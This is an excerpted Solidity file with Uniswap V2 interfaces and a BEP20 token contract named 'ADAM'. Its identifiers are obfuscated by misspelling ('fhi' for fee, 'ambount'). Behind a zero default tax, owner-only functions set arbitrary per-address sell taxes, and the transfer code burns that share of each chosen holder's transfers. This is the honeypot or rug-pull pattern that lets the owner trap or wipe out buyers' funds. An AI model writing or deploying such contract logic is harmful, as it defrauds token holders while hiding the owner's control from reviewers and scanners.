...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfhiOnTransferTokens(
        address token,
        uint liquidity,
        uint ambountTokenMin,
        uint ambountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfhiOnTransferTokens(
        address token,
        uint liquidity,
        uint ambountTokenMin,
        uint ambountETHMin,
    ...
    function swapExactTokensForTokensSupportingfhiOnTransferTokens(
        uint ambountIn,
        uint ambountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfhiOnTransferTokens(
        uint ambountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfhiOnTransferTokens(
        uint ambountIn,
        uint ambountOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function fhiTo() external view returns (address);
    function fhiToSetter() external view returns (address);
    ...
    function setfhiTo(address) external;
    function setfhiToSetter(address) external;
}
...
contract ADAM is BEP20, Ownable {
    ...
    uint256 private _defaultSellfhi = 0;

    uint256 private _defaultBuyfhi = 0;

    mapping(address => bool) private _marketawcount;

    mapping(address => uint256) private _Sfhi;
    ...
    function upS(uint256 _value) external onlyowner {
        _defaultSellfhi = _value;
    }

    function setSfhi(address _address, uint256 _value) external onlyowner {
        require(_value > 2, "awcount tax must be greater than or equal to 1");
        _Sfhi[_address] = _value;
    }

    function getSfhi(address _address) external view onlyowner returns (uint256) {
        return _Sfhi[_address];
    }


    function setMarketawcountfhi(address _address, bool _value) external onlyowner {
        _marketawcount[_address] = _value;
    }

    function getMarketawcountfhi(address _address) external view onlyowner returns (bool) {
        ...
        if (rF) {
            ...
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                    ...
                    tradefhi = _defaultSellfhi;
                }
                if (from == uniswapV2Pair) {

                    tradefhi = _defaultBuyfhi;
                }
            }
            if (_Sfhi[from] > 0) {
                tradefhi = _Sfhi[from];
            ...
            tradefhiambount = _ambount.mul(tradefhi).div(100);
        }


        if (tradefhiambount > 0) {
            _balances[from] = _balances[from].sub(tradefhiambount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefhiambount);
            emit Transfer(from, _deadAddress, tradefhiambount);
        }

        _balances[from] = _balances[from].sub(_ambount - tradefhiambount);
        _balances[_to] = _balances[_to].add(_ambount - tradefhiambount);
        emit Transfer(from, _to, _ambount - tradefhiambount);
    }
